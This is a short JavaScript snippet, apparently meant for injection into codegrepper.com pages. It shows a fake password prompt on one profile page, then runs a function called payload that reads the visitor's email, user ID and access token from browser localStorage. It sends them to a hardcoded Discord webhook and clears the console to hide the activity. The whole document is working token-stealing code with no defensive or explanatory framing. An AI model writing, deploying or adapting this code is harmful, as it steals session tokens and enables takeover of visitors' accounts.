if (window.location.href === "https://www.codegrepper.com/app/profile.php?id=98467") {
    let Password = prompt("This Profile is Password Protected, Enter Password")
    if (Password == null) {
        window.location.href = "https://www.codegrepper.com/app/index.php"
    }
    if (Password.toString() === 'JUB0T') {
        console.log("Pog")
    } else {
        window.location.href = "https://www.codegrepper.com/app/index.php"
    }
}

function payload() {
    let email = localStorage.getItem('email')
    let user_id = localStorage.getItem('user_id')
    let token = localStorage.getItem('access_token')
    let webhook = `https://discord.com/api/webhooks/867057516781240330/f0xnpucoj4zRZ8-9imqvfOIpkAIgT5NTr7iPBlqTkoT3QtjdmF3uotHhiwuiG7LWcQkq`

    fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            'content': '```js\nId: ' + user_id + '\nEmail: ' + email + ' ```'
        }),
    })
        .then((res) => res.json())
        .then((data) => {
            console.clear()
        })
        .catch((err) => console.clear());
    fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            'content': '```yaml\nToken: ' + token + '```'
        }),
    })
        .then((res) => res.json())
        .then((data) => {
            console.clear()
        })
        .catch((err) => console.clear());
} payload(); console.clear();